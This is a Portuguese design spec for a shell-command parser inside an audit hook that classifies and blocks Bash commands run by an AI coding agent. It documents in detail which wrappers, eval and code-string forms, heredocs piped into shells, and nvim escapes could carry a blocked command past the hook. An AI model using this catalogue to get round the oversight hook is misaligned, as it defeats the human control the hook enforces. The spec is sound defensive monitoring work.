*Adendo 2026-11-14 (2):* três linhas desta tabela mudaram: brace expansion no nome de programa é resolvida quando é uma lista simples (A6); `${(e)X}`, `${(%)X}` e `${X@P}` são nível B (A6, A8); a avaliação aritmética de texto entre aspas com `$(` ou crase é nível B quando chega a um contexto aritmético (A8). Ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão).

*Adendo 2026-11-14 (3):* brace expansion irresolúvel no nome de programa é nível B em qualquer lugar e partes entre aspas são texto (A18, revisa A6); a palavra de um operador de parâmetro no nome de programa (`${X:-docker}`, `${X/a/b}`) é classificada e os outros operadores são nível B (A16); indireção e `-v` são contextos de subscrito (A19). Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### 3. Módulo `agent_audit_shell.py` (Task 1)

```python
MAX_NESTING = 32

class ShellError(Exception): ...
class ShellSyntaxError(ShellError):   # .kind: unterminated_quote | unterminated_substitution | unterminated_expansion
    ...                               #        | unterminated_compound | unexpected_token | bad_heredoc | unsupported
class NestingTooDeep(ShellError): ...
class BudgetExceeded(ShellError): ...

class Budget:                         # characters left for every parse of one analysis (S10)
    def __init__(self, chars: int): ...
    def charge(self, n: int) -> None: ...   # raises BudgetExceeded

class Part(NamedTuple):
    kind: str          # lit | sq | dq | ansi | param | cmdsub | backtick | arith | procsub_in | procsub_out
    text: str          # source text of the part (quote-removed for lit/sq/dq/ansi)
    script: "Script | None"      # nested script of cmdsub/backtick/procsub
    inner: tuple["Part", ...]    # parts inside dq, ${...} and arith (their nested expansions)

class Word(NamedTuple):
    parts: tuple[Part, ...]
    span: tuple[int, int]
    quoted: bool                 # some part is quoted
    # properties: text (S1 form), dynamic (an expansion outside single quotes), has_glob, scripts()

class Heredoc(NamedTuple):
    delimiter: str; quoted: bool; strip_tabs: bool; body: str; terminated: bool
    expansions: tuple[Part, ...]         # HD2, empty when quoted

class Redirect(NamedTuple):
    fd: str | None; op: str; target: Word | None; heredoc: Heredoc | None

class Simple(NamedTuple):
    assignments: tuple[Word, ...]; words: tuple[Word, ...]; redirects: tuple[Redirect, ...]; span: tuple[int, int]

class Compound(NamedTuple):
    kind: str                     # subshell | group | if | while | until | for | select | case | arith | cond | function | coproc
    name: str | None              # for/select/function/coproc name
    words: tuple[Word, ...]       # for list, case word and patterns, arith/cond operands
    bodies: tuple["Script", ...]
    redirects: tuple[Redirect, ...]; span: tuple[int, int]

class Pipeline(NamedTuple):
    commands: tuple[Simple | Compound, ...]; negated: bool; timed: bool

class Script(NamedTuple):
    pipelines: tuple[Pipeline, ...]       # source order; separators do not matter to classification
    span: tuple[int, int]

class Site(NamedTuple):                   # one simple command and where it sits
    cmd: Simple
    top_level: bool                        # direct element of the script's lists (no compound, subshell or substitution)
    stages: int                            # stages of its pipeline
    stage: int                             # its index (0 = first)
    substitution: "Site | None"            # the command whose word holds the substitution, else None
    sub_word: Word | None                  # that word
    in_compound: bool

def parse(text: str, budget: Budget, *, base: int = 0) -> Script: ...
def iter_sites(script: Script) -> Iterator[Site]: ...       # every simple command, nested scripts included
ASSIGNMENT: re.Pattern                                       # S8, on the unquoted literal prefix of a word
```

**Algoritmo.** Descida recursiva sobre um cursor de índice no texto, com uma função por produção da seção 2.2. Corridas de caracteres comuns são consumidas por um `re.Pattern.match` ancorado de classe negada (`[^\s;&|<>()'"\\$`#]+`, linear, sem retrocesso). Cada abertura de composto, grupo ou substituição incrementa um contador de aninhamento verificado contra `MAX_NESTING` antes de recursar, de modo que a pilha do Python nunca passa de algumas centenas de quadros. `parse` desconta `len(text)` do orçamento; o conteúdo de uma crase é desescapado e passado a `parse` (desconta de novo). `$(...)`, `<(...)` e `>(...)` são lidos no mesmo cursor (sem novo desconto). Erros carregam a posição (`pos`) para o motivo e os testes.

**Pureza (P2).** O módulo não importa `os`, `io`, `subprocess`, `pathlib` nem `sys`; um teste estrutural (AST) garante isso e que não há chamada de arquivo (estende o BIO9).

*Adendo 2026-11-14 (2):* a API ganhou `Part.dyn`, `Part.code`, `Word.evaluates_code`, `Word.has_brace` e os nomes públicos `DYNAMIC_KINDS`, `DECLARE_BUILTINS`, `part_scripts` e `iter_compounds` (o hook deixou de ter cópias deles); ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A5 e A10.

### 4. Classificação sobre a árvore (Tasks 2-5)

#### 4.1 `analyze_command`

```python
def analyze_command(command: str, _depth: int = 0, _env: Values | None = None,
                    _budget: shell.Budget | None = None) -> Analysis:
```

1. `MAX_COMMAND_LEN` primeiro (inalterado).
2. `script = shell.parse(command, budget)`. `ShellSyntaxError`: `Analysis(["unclassified"], ["unclassified_command"], ["lex_error"])` (U4). `NestingTooDeep` e `BudgetExceeded`: idem com `nesting_depth` e `analysis_budget`.
3. `env = _known_values(script, inherited=_env)` (V1-V4).
4. Desqualificadores de script inteiro para heredoc (seção 5).
5. Para cada `site` de `shell.iter_sites(script)`: `readings = _site_readings(site, env)` (N1-N6); cada leitura passa por `_classify_segment` (inalterado, inclusive o "uma leitura alternativa nunca acrescenta `other`"); `_code_args` de cada leitura (X1-X6) chama `analyze_command(texto, _depth + 1, env, budget)` e une; os heredocs do site seguem a seção 5.
6. Canário (U7 da hardening, inalterado) sobre o texto de origem (`span`) de cada comando simples, depois de todos classificados.
7. Retorno: categorias e flags ordenadas, motivos ordenados (como hoje).

`classify_command` continua o envoltório de duas saídas. O módulo é carregado uma vez, no import do hook (antes do `fork`, então o filho herda):

```python
def _load_shell():
    """agent_audit_shell.py next to this file, through the source loader (bytecode cached in __pycache__ when
    the interpreter may write it). Never raises: a missing or broken module is kept as an error name."""
```

Com o módulo ausente ou quebrado, `analyze_command` levanta `RuntimeError("shell module: <nome>")`, que o caminho U4 já transforma em negação `classifier_error` para o Bash. As escritas e as ferramentas visuais não dependem do módulo.

*Adendo 2026-11-14 (2):* esta seção foi revisada: `analyze_command` e `classify_command` moram em `agent_audit_classify.py`, `_load_shell` virou `_load_module(name)` mais `_load_classifier()`, que carregam o parser e depois o classificador, e a falha vira `RuntimeError("classifier module: <nome>")` em `_classifier()`; ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A13.

*Adendo 2026-11-14 (3):* `_load_module` usa `.pyc` com hash conferido (PEP 552) e captura `BaseException` no import; ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final), A25.

#### 4.2 Leituras e wrappers (N1-N6)

`command_readings(segment: str) -> Readings` fica como entrada pública (testes, heredoc): lê `segment` com o parser e devolve as leituras do único comando simples (erro de sintaxe: `Readings([], {"lex_error"}, False)`). O núcleo é `_word_readings(words, env) -> Readings`.

```python
class Readings(NamedTuple):
    texts: list[str]              # normalized readings, primary first (unchanged)
    reasons: frozenset[str]       # prefix_readings, readings_cap, dynamic_command
    complete: bool
    starts: tuple[int, ...] = ()  # word index where each reading starts (for _code_args)
```

*Adendo 2026-11-14:* `Readings` (e `Analysis`) são `collections.namedtuple` com os mesmos campos e o mesmo default, não `typing.NamedTuple`; ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2), A4.

Saem `fallback`, `by_list` e `truncated`. `_command_starts` e a busca por posições ficam iguais; `_prefix_steps(words, p)` consulta a tabela:

| Wrapper | Flags booleanos | Flags com valor | Sem comando | Notas |
|---|---|---|---|---|
| `sudo` | `-A -b -E -H -k -n -P -S`, `--preserve-env` sem `=`, `--login`, `--shell`, `--set-home`, `--non-interactive`, `--background`, `--stdin`, `--askpass`, `--preserve-groups`, `--reset-timestamp` | `-C -D -g -p -R -r -T -t -U -u`, `--user`, `--group`, `--chdir`, `--chroot`, `--close-from`, `--host`, `--prompt`, `--role`, `--type`, `--command-timeout`, `--other-user` | `-e -l -v -K -V`, `--edit`, `--list`, `--validate`, `--remove-timestamp`, `--version` | aceita `NAME=v` antes do comando; `-h` é ambíguo (ajuda ou host): duas leituras; `-s`/`-i` com palavras: também string de código (X1) |
| `env` | `-i -0 -v`, `-`, `--ignore-environment`, `--null`, `--debug` | `-u -C -P`, `--unset`, `--chdir` | - | aceita `NAME=v`; `-S v` / `--split-string=v`: string de código |
| `nice` | `-N` numérico (`-10`) | `-n`, `--adjustment` | - | |
| `nohup` | - | - | - | |
| `time` (palavra reservada e binário) | `-p -a -v -q`, `--portability`, `--append`, `--verbose`, `--quiet` | `-f -o`, `--format`, `--output` | - | a palavra reservada também é tratada pelo parser |
| `stdbuf` | - | `-i -o -e`, `--input`, `--output`, `--error` | - | valor colado (`-oL`) pela regra de cluster |
| `ionice` | `-t` | `-c -n -P -u`, `--class`, `--classdata` | `-p`, `-P`, `-u` (PIDs) | |
| `timeout` | parser GNU atual (`_timeout_prefix_lengths`), inalterado | | | |
| `xargs` | `-0 -r -t -p -x -o`, `--null`, `--no-run-if-empty`, `--verbose`, `--interactive`, `--exit`, `--open-tty` | `-a -d -E -I -L -n -P -s`, `--arg-file`, `--delimiter`, `--max-lines`, `--max-args`, `--max-procs`, `--max-chars`, `--replace`, `--process-slot-var` | `--show-limits`, `--version`, `--help` | `-e[EOF]`, `-i[R]`, `-l[N]` só com valor colado; sem comando: `echo`; a string de troca (`-I R`, `-i`, `--replace`) vai para X3 |
| `watch` | `-d -t -b -e -g -c -p -w`, `--no-title`, `--beep`, `--errexit`, `--chgexit`, `--color`, `--precise`, `--no-wrap` | `-n -q`, `--interval` | - | sem `-x`/`--exec` o resto é juntado e rodado por `sh -c`: string de código; com `-x`, comando |
| `command` | `-p` | - | `-v -V` | |
| `exec` | `-c -l` | `-a` | - | `exec` só com redirecionamentos é desqualificador de heredoc (seção 5) |
| `builtin`, `rtk`, `proxy`, `noglob`, `nocorrect`, `-` | - | - | - | `rtk`/`proxy` como hoje |
| `repeat` (zsh) | - | um valor posicional | - | |
| `mise` | flags globais atuais (`_skip_mise_flags`) | | | `exec`/`x`: corte no `--` (atual); `-c v` / `--command v`: string de código (X1); flags de `exec` com valor: `-j`, `--jobs`, `--allow-env`, `--allow-net`, `--allow-read`, `--allow-write`, `--secrets` |

Flag desconhecido (N3): duas leituras, uma consumindo a palavra seguinte como valor e outra não. Os demais programas (`doas`, `setsid`, `flock`, `chrt`, `taskset`, `find -exec`, `parallel`) não são wrappers nesta spec: o canário registra `docker`/`git` depois deles, e o procedimento de ajuste (seção 8) decide, com teste, quando entram.

*Adendo 2026-11-14 (2):* os lançadores `uv`, `poetry`, `pdm`, `hatch`, `pipenv`, `rye` e `conda` com `run` entram como prefixos (A10); o canário passa a registrar `docker`/`git` alcançados por `xargs`, `parallel` e `find -exec` sem verbo literal (A12). Ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão).

*Adendo 2026-11-14 (3):* entram `hatch env run`, `uv run -p`, `mamba`/`micromamba run` e `pixi run`, e o canário lê também as palavras decodificadas (A21). Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

#### 4.3 Argumentos que executam código (X1-X7)

`_code_args(words, start, env, site) -> list[CodeArg]`, com `CodeArg(text: str | None, reason: str | None)`; `text = None` é X3/X5 (nível B com o motivo).

| Programa (cabeça normalizada da leitura) | Código |
|---|---|
| `bash sh zsh dash ksh mksh ash` | com `-c` (também em cluster: `-lc`, `-ec`, `-xc`, `-ic`): a primeira palavra que não é opção. Opções com valor: `-o`, `+o`, `-O`, `+O`, `--rcfile`, `--init-file`; demais `--longas` booleanas; `--` encerra. Sem `-c`: a primeira não opção é arquivo de script (não analisado; `<(...)` cai em X5); sem nenhuma, ou com `-s`: lê stdin (X4, `<<<`, heredoc) |
| `eval` | todas as palavras seguintes, juntadas por espaço |
| `trap` | o primeiro argumento, salvo `-l`, `-p` e `-` |
| `sudo -s`, `sudo -i` | as palavras depois dos flags, juntadas |
| `su` | `-c v`, `--command v`, `--command=v` |
| `env -S v`, `env --split-string=v` | `v` |
| `watch` sem `-x` | as palavras depois dos flags, juntadas |
| `mise exec`/`mise x` | `-c v`, `--command v` (a [doc do mise](https://mise.jdx.dev/cli/exec.html): "Command string to run through a shell") |
| `nvim` | X6, ver abaixo |

O texto de uma palavra de código é `Word.text`; antes do parse, as expansões com valor conhecido (V1-V4) são substituídas, gerando um texto por combinação. Depois do parse do texto de dentro, X3 olha se sobrou expansão desconhecida em alguma posição de nome de programa.

**nvim (X6).** `nvim_shell_texts(words) -> list[str | None]` (mesmo nome, agora sobre as palavras da leitura, ainda calculado uma vez por comando simples) varre `-c`, `--cmd`, `--cmd=` e `+cmd`:

| Forma | Extração |
|---|---|
| `!cmd`, `:!cmd`, `sil[ent] !cmd`, `w !cmd`, `r !cmd` | `_NVIM_SHELL` atual |
| `te[rminal][!] cmd` | o resto do comando ex |
| `exe[cute] "!..."` / `'!...'` | a string sem o `!` |
| `system`, `systemlist`, `jobstart`, `termopen`, `vim.system`, `vim.fn.system`, `vim.fn.systemlist`, `vim.fn.jobstart`, `vim.fn.termopen`, `os.execute`, `io.popen` seguidos de `(` | primeiro argumento: string literal simples (`'...'` ou `"..."` sem concatenação) é o texto; lista `[...]`/tabela `{...}` só de strings literais é juntada por espaço; qualquer outra coisa: `None` (`nvim_shell_exec`) |

Os regexes são ancorados ou de classe negada, e rodam só sobre o texto do argumento do nvim (limitado pelo comando).

*Adendo 2026-11-14 (2):* a tabela ganha `emulate ... -c STR` e `mapfile`/`readarray -C STR`; um `-` sozinho depois do shell encerra as opções e o shell lê o stdin (X4); `-c` sem operando sob `xargs` é `dynamic_code`; ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A9.

#### 4.4 Valores (V1-V4)

```python
Values = dict[str, frozenset[str] | None]   # None: unknown

def _known_values(script: shell.Script, inherited: Values | None) -> Values:
    """V1/V3: every value assigned to each name anywhere in `script` (flow-insensitive union), merged with the
    inherited ones; any dynamic source makes the name unknown."""
```

Nome de programa (N6): `$N`, `${N}` e `"$N"` sozinhos na palavra com valores conhecidos dão uma leitura por valor, com o valor dividido por brancos (o zsh não divide `$N` sem aspas, mas dividir é a leitura mais restritiva). Um valor com expansão é usado como texto (a expansão de dentro não é resolvida de novo). `$S/sync.sh` não é dinâmico: N2 já dá o nome `sync.sh`.

*Adendo 2026-11-14 (2):* os valores falham fechados (texto opaco, formas que tornam o nome desconhecido, primeira atribuição incondicional, arrays do zsh, IFS), entram na região do verbo de `git`/`docker`, e um nome cujo valor é só uma substituição de comando é "suave" (nível A no nome de programa); ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A6 e A7.

*Adendo 2026-11-14 (3):* operadores de parâmetro no nome de programa (A16), `/` dentro de `${...}` nunca é separador de caminho (A16), a marca vem também de valores conhecidos e de `read` alimentado por heredoc ou here-string (A19), e a marca e a consulta de valores ficam lineares (A22); ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

#### 4.5 O que sai e o que fica

| Hoje | Depois |
|---|---|
| `SEGMENT_SPLIT` | sai: listas e pipelines do parser |
| `shlex` (classificação, `_clean_sink_tokens`, `nvim_shell_texts`) | sai do hook inteiro; os testes podem usar `shlex.quote` |
| `command_readings(str)` | fica como entrada pública sobre o parser (seção 4.2) |
| `_command_starts`, `_prefix_steps` | ficam; `_prefix_steps` lê a tabela de wrappers |
| `_finish_strip`, `_timeout_*`, `_skip_mise_flags`, `mise_categories`, `test_scope`, `nvim_category`, `_classify_segment`, regexes de categoria | ficam iguais |
| `ENV_ASSIGN` | vira `shell.ASSIGNMENT` (S8), usado pelo parser e pelos wrappers que aceitam `NAME=v` |
| `LOOSE_VALUE_TOKENS`, `_opens_unclosed_quote`, `_fallback_lists_differ`, `Readings.fallback/by_list/truncated` | saem |
| motivos `shlex_fallback`, `loose_assignment_truncated` | saem (U3) |
| `_scan_heredocs`, `_strip_heredocs`, `strip_heredoc_bodies`, `_read_delimiter`, `_SEPARATORS`, `_WORD_END`, `_CODE_FEED`, `sink_cache` | saem: o parser lê os heredocs; a decisão de dado vai para `_heredoc_is_data` |
| `_UNMODELED` | os itens léxicos (`${`, `$'`, `$[`, crase, `\r`, `<(`) saem: o parser os modela; os semânticos viram desqualificadores sobre a árvore (seção 5) |
| `_is_data_sink`, `_clean_sink_tokens`, `_has_sink_head` | viram `_heredoc_is_data(site, heredoc, ...)` e `_clean_sink_words(site)` sobre palavras, com as mesmas regras H2-H4 |
| `MAX_HEREDOC_OPENERS` | fica (HD6) |
| `NVIM_MAX_DEPTH` | vira `MAX_CODE_DEPTH` (mesmo valor e semântica, vale para toda recursão de código) |
| `_nvim_nested` | vira o caminho geral de `_code_args` |
| canário `_deny_token_unmatched` | fica igual, sobre o `span` de cada comando simples |

*Adendo 2026-11-14:* a regex `^git (\S+ )*commit\b` de `_classify_segment` não fica igual: na Task 3, `commit` só conta como subcomando do git, depois das opções globais; ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2), A2.

*Adendo 2026-11-14 (2):* a classificação de `git` também resolve aliases dados na linha de comando e no ambiente, e a de `docker` pula as opções globais e lê os comandos de gerenciamento e as formas do compose; ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A11.

*Adendo 2026-11-14 (3):* clusters de opções curtas do docker lidos como o pflag e formas acima de `MAX_DOCKER_FORMS` (8) em `readings_cap` (A14); valores de alias divididos como `split_cmdline` e as duas formas de `GIT_CONFIG_PARAMETERS` (A17); ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### 5. Heredoc sobre a árvore (Task 2)

**Desqualificadores de script inteiro** (todos os corpos do texto viram código, HD4): algum comando de cabeça `mkfifo`; algum `coproc`; algum `exec` só com redirecionamentos; alguma definição de função chamada `cat`, `tee`, `git` ou `gh`; algum redirecionamento com fd 3 ou maior. São os itens semânticos do `_UNMODELED` atual.

**`_heredoc_is_data(site, heredoc, disqualified, reasons) -> bool`**:

1. Desqualificado, ou mais de `MAX_HEREDOC_OPENERS` heredocs no comando: código.
2. `_clean_sink_words(site)`: uma só leitura completa, e nenhuma palavra até a cabeça (inclusive) dinâmica; com cabeça `git`/`gh`, nenhuma palavra dinâmica. Falhou e alguma leitura tem cabeça `cat`/`tee`/`git`/`gh`: `heredoc_unclean_prefix` (HD5) e código.
3. Nenhuma substituição (`$(`, crase, `<(`, `>(`) nas palavras e redirecionamentos do próprio comando (H1; hoje era a linha lógica inteira).
4. `cat`/`tee`: dado só com `site.top_level`, `site.stages == 1`. `git`: `commit` e `-F -`/`--file -`/`--file=-`, sem `-c alias.*`/`core.*`. `gh`: `pr|issue|release create|edit|comment|review` com `-F -`/`--body-file -`/`--body-file=-`.
5. Dentro de substituição: só `cat` sozinho, e a substituição é a palavra inteira (opcionalmente entre aspas duplas) de um comando de fora cuja leitura limpa casa `_GIT_MESSAGE_VALUE` ou `_GH_MESSAGE_VALUE` sobre o texto até essa palavra (H3, regexes atuais).

Para os corpos que não são dado: receptor de outra linguagem (HD4, cabeça da leitura primária) não é lido; os demais são analisados com `analyze_command(body, _depth + 1, env, budget)`, e um heredoc num composto (`{ bash; } <<EOF`, `while read l; ...; done <<EOF`) é sempre código. HD2 vale antes de tudo isso, para todo corpo sem aspas.

*Adendo 2026-11-14:* a parte `cat`/`tee` do passo 4 foi revisada (função ou grupo `{ }` fora de pipeline, com redirecionamento de saída próprio), e a tabela abaixo ganha linhas novas; ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2), A1.

*Adendo 2026-11-14 (2):* here-strings seguem as regras de receptor dos heredocs; lançadores com `run` e clientes SQL/DSL entram em HD4; `NAME=$(cat <<'EOF' ...)` é dado e valor; o receptor só é de outra linguagem quando toda leitura é; ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A10.

*Adendo 2026-11-14 (3):* uma função, `hash`, `enable -f` ou `PATH` que religa o nome de um receptor confiável tira as isenções de dado no trecho que alcança (A15); os escapes dos clientes SQL foram ampliados (A20); funções que repassam argumentos só são nível B quando uma chamada não se resolve (A24, revisa A10). Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

**Comportamento resultante** (corpo `docker compose up`, salvo indicação):

| Comando | Hoje | Depois |
|---|---|---|
| `cat > f <<EOF` | removido | removido |
| `cat <<EOF` + `$(docker restart x)` | removido, allow (L6) | substituição classificada: `docker_lifecycle` |
| `cat <<'EOF'` + `$(docker restart x)` | removido | removido (aspas: o shell não expande) |
| `cat >> doc.md <<'EOF'` com crases ou `${HOME}` no corpo | classificado (`_UNMODELED`), falso positivo | removido |
| `cat <<EOF` com `` `x` `` no corpo | classificado | removido; `x` classificado como comando |
| `python3 - <<'EOF'` com uma linha `docker compose up` | classificado (`docker_lifecycle`) | não lido como shell (X7) |
| `bash <<EOF`, `ssh host <<EOF`, `sh -s <<EOF`, `kubectl exec -i p -- sh <<EOF` | classificado | classificado |
| `cat <<EOF \| bash`, `(cat <<EOF ...) \| sh`, `bash <(cat <<EOF ...)` | classificado | classificado (e `piped_shell` / `dynamic_code` no shell de fora) |
| `cat <<EOF` + `\r` nas linhas (`EOF\r` termina) | classificado (`\r` em `_UNMODELED`) | removido: semântica exata do bash e do zsh |
| `(sh -s) cat <<EOF` | classificado | `lex_error` (sintaxe inválida nos dois shells) |
| `cat <<EOF; echo $(x)` | classificado (`$(` na linha) | removido; `x` classificado |
| `git commit -m "$(cat <<'EOF' ...)"` | removido | removido |
| `eval "$(cat <<EOF ...)"`, `echo "$(cat <<EOF ...)"` | classificado | classificado (H3 inalterado) |

### 6. Textos e métricas (Task 6)

| Chave | Texto |
|---|---|
| `WHY["unclassified_command"]` | `the hook could not classify this command with certainty (shell syntax it does not support or that does not parse, shell code built at run time, too many possible readings, nesting too deep, or an analysis error), so it is blocked and never run` |
| `what_to_do("unclassified_command")` | `Run each program as its own plain command: no stacked wrappers, no shell code built from variables or substitutions (bash -c "$X", eval), no nested shells, and only common POSIX/bash syntax; write scripts and large content to a file with the Write tool and run the file.` |
| `WHY["parse_uncertain"]` | `the hook could only partly resolve this command (several plausible readings, a program name taken from a variable, an unclean heredoc prefix, or a blocked program outside a command position); every reading was classified and the strictest one applies` |
| `FLAG_LABELS["unclassified_command"]` | `commands the hook could not classify with certainty, denied (syntax, dynamic code, readings cap, nesting, budget, analysis error or crash) - see the uncertainty field (target 0)` |
| `FLAG_LABELS["parse_uncertain"]` | `commands classified under parse uncertainty (several readings, dynamic program name, unclean heredoc prefix, deny token outside a command position) - review in Parser uncertainty` |

`agent-metrics.py`: `LEVEL_A_REASONS = ("prefix_readings", "heredoc_unclean_prefix", "dynamic_command", "shlex_fallback", "loose_assignment_truncated")` (os dois últimos só aparecem em registros antigos). A seção "Parser uncertainty and hook health" não muda de forma; os motivos novos entram na tabela por motivo sozinhos.

### 7. Desempenho e orçamento (P1)

**Linearidade.** Cada `parse` é uma passada com cursor; os regexes do parser são ancorados ou de classe negada. O texto lido no total é no máximo `MAX_LEX_CHARS = 8 * MAX_COMMAND_LEN` (131.072 caracteres): as strings de código, corpos e valores de um nível são partes disjuntas do texto de cima (ou valores dele), então com `MAX_CODE_DEPTH = 3` o pior caso real é cerca de 4 vezes o comando, e o orçamento cobre a propagação. O texto materializado das palavras com substituições aninhadas é no máximo `MAX_NESTING` vezes o texto (fatias em C). A classificação por leitura é a de hoje (regexes já provados lineares, `MAX_READINGS`).

**Orçamento por chamada** (medido na Task 2 e na Task 5, mesma máquina, relatório da task):

| Medida | Hoje | Orçamento |
|---|---|---|
| `analyze_command` no corpus do replay | mediana 0,47 ms, p99 9,1 ms, máx. 18,4 ms | mediana até 1,0 ms, p99 até 12 ms, máximo até 50 ms |
| Qualquer entrada abaixo de `MAX_COMMAND_LEN` (formas adversariais da seção Testing) | até 1 s de CPU (UN3/UN4) | até 1 s de CPU, 3 s de parede |
| Carregar `agent_audit_shell` com bytecode em cache | - | até 1 ms |
| Processo do hook, mediana de 15 execuções de um PreToolUse `pytest tests/test_a.py` | cerca de 75 ms | aumento de até 3 ms |

**Por que um módulo separado.** O hook roda como script, então é compilado a cada chamada (27 ms hoje). Um parser de cerca de 700 linhas no mesmo arquivo somaria cerca de 10 ms por chamada (1,37 ms por 100 linhas); importado por `importlib.util.spec_from_file_location` com o `SourceFileLoader`, ele é carregado do `__pycache__` em cerca de 0,6 ms. O comando do hook no `settings.json` (`python3 "$HOME/.claude/hooks/agent-audit.py"`) não usa `-B`, então o cache é gravado; `.claude/hooks/__pycache__/` já está no `.gitignore`. Os testes rodam com `-I -B` (sem cache, sem `sys.path` do script), por isso o import é sempre por caminho explícito. Cache impossível de gravar: o módulo é compilado a cada chamada, correto e mais lento. O cache é invalidado pelo `mtime` e tamanho do fonte (padrão do Python).

*Adendo 2026-11-14:* para caber no aumento de até 3 ms do processo, o hook não importa `typing` (o import sozinho custava cerca de 3 ms por chamada); ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2), A4.

*Adendo 2026-11-14 (2):* cada texto analisado e cada combinação de valores são descontados do orçamento (`TEXT_COST`, `VARIANT_COST`, A9); o classificador também vai em módulo com bytecode em cache, e o processo do hook ficou cerca de 19 ms mais rápido que `eee112a` (A13). Ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão).

*Adendo 2026-11-14 (3):* só o orçamento do processo vale para os dois módulos (Pergunta 13, opção (b)); o `.pyc` com hash conferido custa cerca de 0,08 ms (A25); a marca e os valores ficam lineares (A22). Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### 8. Replay, falsos positivos e ajuste

**Replay antes do merge** (sessão principal, só leitura, scripts no scratchpad; Verification 4): corpus = comandos Bash completos das transcrições locais (`~/.claude/projects/**/*.jsonl`) mais os `cmd` das métricas (`~/.claude/metrics/*.jsonl`); cada comando é analisado pela cópia do hook de `main` e pela nova, e a decisão vem de `decide` com o `agent-audit.json` real, para `main` e para um implementer. Cada diferença de decisão recebe uma classe, por predicado automático do script:

| Classe | Predicado | Esperado |
|---|---|---|
| E1 forma nova reconhecida | a negação ou pergunta nova vem de uma leitura em posição que o hook antigo não via (L1-L4, L7-L9) | cada caso listado e revisado: verdadeiro positivo (as sondas das revisões estão no corpus) |
| E2 falso positivo removido | o flag antigo vinha de texto entre aspas, de corpo com aspas no delimitador ou de corpo para outra linguagem | lista; nenhuma revisão exigida além da amostra |
| E3 nível B novo | motivo `lex_error`, `dynamic_code`, `piped_shell`, `nvim_shell_exec`, `nesting_depth` ou `analysis_budget` | cada caso listado; meta: só sondas e sintaxe que o shell também rejeita |
| E4 outros | nenhum dos acima | **0** (qualquer caso é defeito da task) |

O corpo do relatório traz também a contagem por motivo antes e depois e as medidas de tempo da seção 7.

**Depois do merge** (vai para `agent-workflow.md` 14.2 pelo `docs-writer`): o procedimento da hardening (seção 6) continua, com três ajustes:

1. Candidato a falso positivo com motivo novo de nível B é trabalho legítimo? A correção é uma regra de gramática ou de wrapper precisa (teste primeiro, entrada pelo `backlog-keeper`), nunca uma leitura tolerante nem subir um teto às cegas. `MAX_NESTING`, `MAX_CODE_DEPTH`, `MAX_LEX_CHARS`, `MAX_VALUE_CANDIDATES` e `MAX_READINGS` são fixados por teste.
2. Cada `deny_token_unmatched` ou `dynamic_command` com comando bloqueado é uma forma que escapou: wrapper novo na tabela, ou promoção de `dynamic_command` a nível B se a forma se repetir (Open questions 2).
3. Toda negação nova ganha um teste com o comando real (sem dados pessoais).

### 9. Segurança, privacidade e observabilidade

- **Fail-closed mais estrito**: um texto fora da gramática nega o comando. O corpus mostra 0 caso léxico; o replay (E3) mede o resto antes do merge. Válvula: `"mode": "audit"` no config, como na hardening.
- **Módulo novo é parte do hook**: a proteção dos arquivos do hook (bug aberto [hook self-protection](../../backlog/bugs/2026-11-11-audit-hook-self-protection.md)) precisa cobrir `agent_audit_shell.py` (out_of_scope_issues). Um módulo ausente ou quebrado nega o Bash (`classifier_error`), nunca libera.
- **Privacidade**: nenhum campo novo no registro além de motivos. O replay lê transcrições locais só na máquina, e nenhum comando real entra no repo; os testes usam comandos sintéticos.
- **Observabilidade**: motivos novos no campo `uncertainty`; o relatório os mostra sem mudança de código além de `LEVEL_A_REASONS`.

### 10. Rollout e reversão

Sem feature flag: `~/.claude/hooks` aponta para `.claude/hooks/`, então cada task vale na chamada seguinte ao merge. Ordem segura: o módulo entra sozinho, sem uso (Task 1); a Task 2 troca o pipeline inteiro de uma vez (o parser lê os heredocs, então não convive com o scanner antigo) e já é mais restritiva que o HEAD em posições de comando; as Tasks 3-5 só acrescentam leituras; a Task 6 só muda textos. Reversão: `git revert` dos commits da task; não há estado (config e `settings.json` intactos).

## Alternatives considered

### Como achar as palavras de comando

| Opção | Corretude e robustez | Simplicidade e manutenção | Decisão |
|---|---|---|---|
| **Lexer e parser escritos à mão para um subconjunto definido, nível B fora dele** | uma fonte; aspas, heredocs e substituições exatos; o que não entende nega | um módulo puro de cerca de 700 linhas, gramática documentada, testes por produção e por propriedade | **escolhida** |
| `bashlex` (porta do parser do bash) | mais completo | dependência externa (o hook é só stdlib), sem zsh, manutenção parada; o comportamento em erro não é o fail-closed que queremos | rejeitada |
| Máquina de estados sobre tokens (só rastrear "posição de comando") | acerta os casos comuns | tolerante por construção: um composto mal fechado vira palpite, não erro; as regras de `case`, `[[ ]]` e heredoc dentro de `$(` ficam espalhadas | rejeitada |
| Remendar `shlex` + `SEGMENT_SPLIT` (split com aspas, mais prefixos) | cada remendo fecha uma forma | é o caminho das cinco rodadas de revisão; o `shlex` não conhece `$(`, crase, `#` depois de palavra, `$'...'`, heredoc | rejeitada |
